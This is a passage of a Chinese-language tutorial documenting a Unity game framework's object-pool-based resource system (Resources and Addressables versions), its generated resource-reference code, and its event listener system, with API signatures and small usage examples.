ResSystem.InstantiateGameObjectAsync("Bullet", getBullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>通过assetPath加载游戏物体并实例化返回。</li>
<li>实例化的游戏物体会设置父物体为parent，不填则默认为null无父物体在最顶层。</li>
<li>实例化的物体名称优先为keyName，keyName为null时则为assetName。</li>
<li>优先根据keyName从对象池获取，不填keyName则根据path加载的资源名在对象池中查找。</li>
<li>对象池中找不到根据assetpath走Resources加载出对象，不填assetPath时则通过keyName查询路径加载对象。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
<li>异步加载游戏物体及其组件的方法返回值为void类型，无法即时快速加载的游戏物体，需要通过callback回调函数获取加载的GameObject对象并进行使用。</li>
</ul>

<ul>
<li>资源系统如果资源路径正确，则返回值必不为空，优先从对象池中获取，对象池中不存在则根据Load的对象进行实例化返回。</li>
</ul>
<h5 data-id="heading-23">GameObject卸载</h5>
<p>卸载GameObject即将GameObject放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/gameObject.name回收gameObject</span>
<span class="hljs-comment">//string keyName, GameObject gameObject</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(string keyName, gameObject);
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(gameObject);




<span class="hljs-comment">//简单示例，卸载子弹对象bullet</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(bullet, "Bullet");
</code></pre>
<ul>
<li>通过gameObject指定卸载的对象，keyName指定对象池名，不填则按照gameObject的对象名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将gameObject放入。</li>
</ul>
<h4 data-id="heading-24">Unity资源</h4>
<p>这类资源不需要进行实例化，所以不需要过对象池，只需要直接使用数据或者引用，比如AudioClip，Sprite，prefab。</p>
<h5 data-id="heading-25">加载Asset</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据assetPath异步加载T类型资源</span>
<span class="hljs-comment">//(string assetPath, Action&lt;T&gt; callBack)</span>
ResSystem<span class="hljs-selector-class">.LoadAssetAsync</span>&lt;T&gt;(assetPath, callBack);
<span class="hljs-comment">//根据assetPath加载T类型资源</span>
ResSystem<span class="hljs-selector-class">.LoadAsset</span>&lt;T&gt;(assetPath);
<span class="hljs-comment">//加载指定路径的所有资源，返回object数组</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>(assetPath);
<span class="hljs-comment">//加载指定路径的所有资源返回T类型</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>&lt;T&gt;(assetPath);


<span class="hljs-comment">//简单示例，加载Resources下的clip音频资源</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>&lt;AudioClip&gt;("Resources/clip");
</code></pre>
<ul>
<li>通过assetPath路径加载资源，T用来指明加载的资源类型。</li>
<li>异步加载资源需要通过传入callback回调获取加载的资源并进行使用。</li>
<li>加载所有资源时不指定T则返回object数组。</li>
<li>注意加载的资源不会被自动释放。</li>
</ul>
<h5 data-id="heading-26">卸载Asset</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//卸载某个资源</span>
<span class="hljs-comment">//（UnityEngine.Object assetToUnload）</span>
ResSystem<span class="hljs-selector-class">.UnloadAsset</span>(assetToUnload);
<span class="hljs-comment">//卸载所有资源</span>
ResSystem<span class="hljs-selector-class">.UnloadUnusedAssets</span>();
</code></pre>
<p>卸载资源实际指释放内存中的asset。</p>
<p>对象池是帮做资源回收利用的，避免频繁GC，对象池管理不了Asset资源。而释放是资源不用了也不需要回收卸载掉就行了，GO的自动释放资源系统已经做好了，Asset需要你根据自己的需求来释放，因为Asset也没有生命周期，只能自己释放。</p>
<h3 data-id="heading-27">Addressables版本</h3>
<h4 data-id="heading-28">普通类对象(obj)</h4>
<p>类对象资源不涉及异步加载、Resources和Addressables的区别，直接走对象池系统，。</p>
<h5 data-id="heading-29">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem一致。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType());
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成T类型的对象放入对象池）。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h5 data-id="heading-30">obj加载</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-comment">//string keyName</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;(keyName);
<span class="hljs-comment">//根据T类型名从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;();


<span class="hljs-comment">//简单示例,获取Data数据类的一个对象</span>
<span class="hljs-type">GameObject</span> go1 <span class="hljs-operator">=</span> <span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">Data</span>&gt;(<span class="hljs-string">"Data"</span>);
</code></pre>
<ul>
<li>通过keyName指定加载的类对象名，不填keyName则按照T的类型名加载。</li>
</ul>

<ul>
<li>加载时优先通过对象池获取，如果对象池中无对应资源，自动new一个类对象返回，保证返回值不为null。</li>
</ul>
<h5 data-id="heading-31">obj卸载</h5>
<p>卸载obj即将obj放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/obj类型名将obj放回对象池</span>
<span class="hljs-comment">//object obj, string keyName</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj);
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj, string keyName);


<span class="hljs-comment">//简单示例，卸载Data类的对象data</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(data, "Data");
</code></pre>
<ul>
<li>通过obj指定卸载的对象，keyName指定对象池名，不填则按照obj的类型名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将obj放入。</li>
</ul>
<h4 data-id="heading-32">游戏对象（GameObject）</h4>
<h5 data-id="heading-33">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem有区别，Addressables版本通过Addressables name来获取prefab（参考副本），Res需要传路径来获取prefab（参考副本）。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, string assetName = null, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName, maxCapacity,assetName, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName);
<span class="hljs-comment">//根据assetName在Addressables中的资源名初始化GOP</span>
<span class="hljs-comment">//(string assetName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName, maxCapacity, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池（假设Addressable资源名称为Bullet），最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入assetName（Addressable资源的名称）根据获取的资源名指定对象池的名字，优先keyName，没有keyName则使用assetName。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过assetName和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动加载GameObject放入对象池）。</li>
<li>默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
</ul>
<h5 data-id="heading-34">GameObject加载并实例化</h5>
<p>Addressable版本中游戏物体参数通过Addressable资源名assetName（Res是资源路径assetPath）指定，支持加载出的对象Destroy时在Addressables中自动释放。</p>
<pre><code class="hljs language-ini" lang="ini">//API
//加载游戏物体
//(string assetName, Transform <span class="hljs-attr">parent</span> = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObject(assetName, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName)<span class="hljs-comment">;</span>
//加载游戏物体并获取组件T
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体
//(string assetName, Action&lt;GameObject&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体并获取组件T
//(string assetName, Action&lt;T&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName)<span class="hljs-comment">;</span>


//简单示例
//实例化一个子弹对象（假设AB资源名称为Bullet）
GameObject <span class="hljs-attr">bullet</span> = ResSystem.InstantiateGameObject(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//实例化一个子弹对象取出并获取其刚体组件
Rigbody <span class="hljs-attr">rb</span> = ResSystem.InstantiateGameObject&lt;Rigbody&gt;(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//异步实例化一个子弹对象,并在其加载完后坐标归零
void getBullet(GameObject bullet)
{
    <span class="hljs-attr">bullet.transform.position</span> = Vector3.zero<span class="hljs-comment">;</span>
    }
ResSystem.InstantiateGameObjectAsync("Bullet", getBullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>通过assetName加载游戏物体并实例化返回</li>
<li>实例化的游戏物体会设置父物体为parent，不填则默认为null无父物体在最顶层。</li>
<li>实例化的物体名称优先为keyName，keyName为null时则为assetName。</li>
<li>优先根据keyName从对象池获取，不填keyName则根据assetName在对象池中查找。</li>
<li>对象池中无缓存，则根据assetName从Addressable中获取资源,不填assetName则根据keyName从Addressable中获取资源。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
<li>autoRelease为true则通过事件工具为加载出的对象添加事件监听，会在其Destroy时自动调用Addressables的Release API。</li>
<li>异步加载游戏物体及其组件的方法返回值为void类型，无法即时直接加载的游戏物体，需要通过callback回调获取加载的GameObject对象并进行使用。</li>
</ul>

<ul>
<li>如果资源路径正确，则返回值必不为空，优先从对象池中获取，对象池中不存在则根据Load的对象进行实例化返回。</li>
</ul>
<h5 data-id="heading-35">GameObject卸载</h5>
<p>卸载GameObject即将GameObject放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/gameObject.name卸载gameObject</span>
<span class="hljs-comment">//(string keyName, GameObject gameObject)</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(keyName, gameObject);
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(gameObject);


<span class="hljs-comment">//简单示例，卸载子弹对象bullet</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(bullet, "Bullet");
</code></pre>
<ul>
<li>通过gameObject指定卸载的对象，keyName指定对象池名，不填则按照gameObject的对象名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将gameObject放入。</li>
</ul>
<p>‍</p>
<h4 data-id="heading-36">Unity资源</h4>
<p>这类资源不需要进行实例化，所以不需要过对象池，只需要使用数据或者引用，比如AudioClip，Sprite，prefab(没有经过实例化的GameObject原本)。</p>
<h5 data-id="heading-37">加载Asset</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>


<span class="hljs-comment">//根据assetName加载T类型资源</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAsset</span>&lt;<span class="hljs-type">T</span>&gt;(assetName);
<span class="hljs-comment">//根据keyName批量加载所有资源(IList&lt;T&gt;)</span>
<span class="hljs-comment">//(string keyName, out AsyncOperationHandle&lt;IList&lt;T&gt;&gt; handle, Action&lt;T&gt; callBackOnEveryOne = null)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssets</span>&lt;<span class="hljs-type">T</span>&gt;(keyName, handle, callBackOnEveryOne);


<span class="hljs-comment">//根据assetName异步加载T类型资源（void）</span>
<span class="hljs-comment">//(string assetName, Action&lt;T&gt; callBack)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssetAsync</span>&lt;<span class="hljs-type">T</span>&gt;(string assetName, <span class="hljs-type">Action</span>&lt;<span class="hljs-type">T</span>&gt; callBack);
<span class="hljs-comment">//根据keyName批量异步加载所有资源（void）</span>
<span class="hljs-comment">//(string keyName, Action&lt;AsyncOperationHandle&lt;IList&lt;T&gt;&gt;&gt; callBack, Action&lt;T&gt; callBackOnEveryOne = null)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssetsAsync</span>&lt;<span class="hljs-type">T</span>&gt;(keyName, callBack, callBackOnEveryOne);


<span class="hljs-comment">//简单示例，加载Addressable clip音频资源</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssets</span>&lt;<span class="hljs-type">AudioClip</span>&gt;(<span class="hljs-string">"clip"</span>);
</code></pre>
<ul>
<li>通过path路径加载资源，T用来指明加载的资源类型。</li>
<li>异步加载单个资源需要通过传入callback回调获取加载的资源并进行使用。</li>
<li>批量加载资源时keyName是Addressable中的Labels。</li>
<li>handle用于释放资源,批量加载时，如果释放资源要释放掉handle，直接去释放资源是无效的.</li>
<li>Addressable加载指定keyName的所有资源时，支持每加载一个资源调用一次callBackOnEveryOne。</li>
<li>异步加载完指定keyName所有资源时，调用callback获取加载的资源集合并进行使用。</li>
<li>注意加载的资源不会被自动释放。</li>
</ul>
<h5 data-id="heading-38">卸载Asset</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//释放某个资源</span>
<span class="hljs-comment">//（T obj）</span>
ResSystem<span class="hljs-selector-class">.UnloadAsset</span>&lt;T&gt;(T obj);
<span class="hljs-comment">//销毁对象并释放资源</span>
<span class="hljs-comment">//(GameObject obj)</span>
ResSystem<span class="hljs-selector-class">.UnloadInstance</span>(obj);
<span class="hljs-comment">//卸载因为批量加载而产生的handle</span>
<span class="hljs-comment">//(AsyncOperationHandle&lt;TObject&gt; handle)</span>
UnLoadAssetsHandle&lt;TObject&gt;(handle);
</code></pre>
<p>卸载Asset即释放资源,可以在Destroy游戏对象的同时释放Addressable资源。</p>
<h3 data-id="heading-39">资源系统-自动生成资源引用代码</h3>
<p>针对Addressables版本，使用字符串来加载资源方式比较麻烦，而且容易输错，框架提供一种基于引用加载的方式。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bab11f7f3e5c42f1aaad7325eea63c0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=fN58fhRyZsauxE4k5DOeBD7pk14%3D" alt="alt" loading="lazy"/>​</p>
<p>通过Editor工具会在指定路径下生成资源引用代码R。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bc542d6844e459ab2a85b57e7254597~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iXbOuV6ttrAaepIur0WIMFsfImU%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-ini" lang="ini">// API
//返回一个资源
R.GroupName.AddressableName<span class="hljs-comment">;</span>
//返回一个资源的实例
//(Transform <span class="hljs-attr">parent</span> = null,string keyName=null,bool autoRelease = <span class="hljs-literal">true</span>)
R.GroupName.AddressableName(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
R.GroupName.AddressableName(parent, keyName)<span class="hljs-comment">;</span>
R.GroupName.AddressableName(parent)<span class="hljs-comment">;</span>


//使用示例
//获取一个Bullet预制体资源（不实例化）
Gameobject <span class="hljs-attr">bullet</span> = R.DefaultLocalGroup.Bullet<span class="hljs-comment">;</span>
//获取一个Bullet实例
Gameobject <span class="hljs-attr">bullet</span> = R.DefaultLocalGroup.Bullet(x.transform)<span class="hljs-comment">;</span>


//释放
ResSystem.UnloadAsset&lt;GameObject&gt;(bullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>R是资源脚本的命名空间，固定。</li>
<li>GroupName是Addressable的组名。</li>
<li>AddressableName是资源名。</li>
<li>如果填写keyName，则先去对象池中找资源实例，找不着再通过Addressable获取资源并实例化。</li>
<li>parent为实例的父物体。</li>
<li>autoRelease为true则实例会在Destroy时自动释放Addressable中对应的资源。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad41d5d404cc4a3ab4fcad22fc96e27e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=GiU2cfnk1Kny%2B2NZSBQ1einzv4A%3D" alt="alt" loading="lazy"/>​</p>
<p>对于Sprite的子图，也支持直接引用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143b3a4bc26140dda4d9a66fee56ce80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=k6KcNqYYuf2Z1lsi8WchOS%2BsnTc%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//子图</span>
R.LV2.Img_Img_0;
<span class="hljs-comment">//总图</span>
R.Lv2.Img;
</code></pre>
<h2 data-id="heading-40">事件系统</h2>
<p>框架的事件系统主要负责高效的方法调用与数据传递，实现各功能之间的解耦，通常在调用某个实例的方法时，必须先获得这个实例的引用或者新实例化一个对象，低耦合度的框架结构希望程序本身不去关注被调用的方法所依托的实例对象是否存在，通过事件系统做中转将功能的调用封装成事件，使用事件监听注册、移除和事件触发完成模块间的功能调用管理。常用在UI事件、跨模块事件上。</p>
<p>事件系统支持无返回值的Action，Func实际应用意义不大。</p>
<h3 data-id="heading-41">事件监听添加</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加无参数的事件监听</span>
<span class="hljs-comment">//string eventName, Action action</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>(eventName, action); 
<span class="hljs-comment">//添加多个参数的事件监听</span>
<span class="hljs-comment">//string eventName</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1, T2&gt;(eventName, action);
...
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1, ..., T15&gt;(eventName, action);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//添加无参数的事件监听,Doit方法对应名称为Test的事件</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("Test", Doit);
void <span class="hljs-built_in">Doit</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Doit");
}
<span class="hljs-comment">//添加多个参数的事件监听，Doit2对应名称为TestM的事件，参数为int，string</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;int, string&gt;("TestM", Doit2);
void <span class="hljs-built_in">Doit2</span>(int a, string b)
{
    Debug<span class="hljs-selector-class">.Log</span>(a);
    Debug<span class="hljs-selector-class">.Log</span>(b); 
}
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>action传无返回值方法。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
</ul>
<h3 data-id="heading-42">事件监听移除</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加无参数的事件监听</span>
<span class="hljs-comment">//string eventName, Action action</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>(eventName, action); 
<span class="hljs-comment">//添加多个参数的事件监听</span>
<span class="hljs-comment">//string eventName</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1, T2&gt;(eventName, action);
...
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1, ..., T15&gt;(eventName, action);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//移除无参数的事件监听,Doit方法对应名称为Test的事件</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>("Test", Doit);
void <span class="hljs-built_in">Doit</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Doit");
}
<span class="hljs-comment">//移除多个参数的事件监听，Doit2对应名称为TestM的事件，参数为int，string</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;int, string&gt;("TestM", Doit2);
void <span class="hljs-built_in">Doit2</span>(int a, string b)
{
    Debug<span class="hljs-selector-class">.Log</span>(a);
    Debug<span class="hljs-selector-class">.Log</span>(b); 
}
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>action传无返回值方法。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
</ul>
<h3 data-id="heading-43">事件触发</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//触发无参数事件</span>
EventSystem.EventTrigger(<span class="hljs-built_in">string</span> eventName);
<span class="hljs-comment">//触发多个参数事件</span>
EventSystem.EventTrigger&lt;T&gt;(<span class="hljs-built_in">string</span> eventName, T arg);
EventSystem.EventTrigger&lt;T0, T1&gt;(<span class="hljs-built_in">string</span> eventName, T0 arg0, T1 arg1);
EventSystem.EventTrigger&lt;T0, T1,..., T15&gt;(<span class="hljs-built_in">string</span> eventName, T0 arg0, T1 arg1, ..., T15 arg15);
 
<span class="hljs-comment">//简单示例，使用添加监听的方法例子</span>
EventSystem.EventTrigger(<span class="hljs-string">"Test"</span>);
EventSystem.EventTrigger&lt;<span class="hljs-type">int</span>,<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"TestM"</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"test"</span>);
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
<li>事件的查询底层使用TryGetValue所以触发不存在的事件并不会报错。</li>
</ul>
<h3 data-id="heading-44">事件移除</h3>
<p>事件移除和事件监听移除的区别参与：</p>
<ul>
<li>事件监听移除只移除一条Action，比如添加了3次同名事件监听，则移除一次后触发还是会执行两次，且eventName记录不会被移除。</li>
<li>事件移除会将事件中心字典中有关eventName的记录连带存储的Action一同清空。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//移除一类事件</span>
<span class="hljs-comment">//(string eventName)</span>
